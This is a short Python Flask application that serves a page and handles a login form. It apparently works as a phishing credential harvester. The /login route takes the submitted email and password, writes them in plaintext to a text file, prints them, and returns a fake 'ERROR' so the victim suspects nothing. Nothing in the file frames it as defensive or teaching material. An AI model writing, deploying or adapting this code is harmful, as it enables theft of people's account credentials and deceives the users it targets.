from flask import Flask, request,render_template, jsonify

app = Flask(__name__)

@app.route('/')
def index():
    return render_template ("site.html")

@app.route('/login', methods=['POST'])
def submit():
    #data = request.get_json()
    email = request.form['email']
    password = request.form['pass']

    # Salvar dados em um arquivo de texto
    with open('data.txt', 'a') as file:
        file.write(f'Email: {email}, Password: {password}\n')
    
    print (f"Email: {email}, Password: {password}\n")

    return "ERROR"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port="8080")